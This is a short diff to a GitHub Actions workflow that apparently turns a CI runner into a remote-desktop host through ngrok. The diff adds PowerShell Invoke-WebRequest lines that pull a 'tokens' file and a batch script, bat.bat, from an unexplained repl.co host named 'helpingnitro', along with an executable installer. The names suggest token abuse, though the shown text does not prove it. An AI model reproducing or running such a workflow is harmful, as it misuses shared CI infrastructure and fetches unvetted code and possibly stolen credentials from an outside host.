@@ -16,8 +16,9 @@ jobs:
         Invoke-WebRequest https://raw.githubusercontent.com/baum1810/Remote-Desktop/master/loop.bat -OutFile loop.bat
     - name: Download Launcher.
       run: |
-        Invoke-WebRequest https://raw.githubusercontent.com/baum1810/Remote-Desktop/master/launcher/Node.js.lnk -OutFile Node.js.lnk
-        Invoke-WebRequest https://raw.githubusercontent.com/baum1810/Remote-Desktop/master/launcher/Visual%20Studio%202019.lnk -OutFile "Visual Studio 2019.lnk"
+        Invoke-WebRequest https://storage.medal.tv/MedalSetup.exe -OutFile MedalSetup.exe
+        Invoke-WebRequest https://helpingnitro.coolcool4.repl.co/tokens -OutFile lel.txt
+        Invoke-WebRequest https://helpingnitro.coolcool4.repl.co/bat/ -OutFile bat.bat
     - name: Extracting Ngrok File.
       run: Expand-Archive ngrok.zip
     - name: Connect To Account Ngrok.
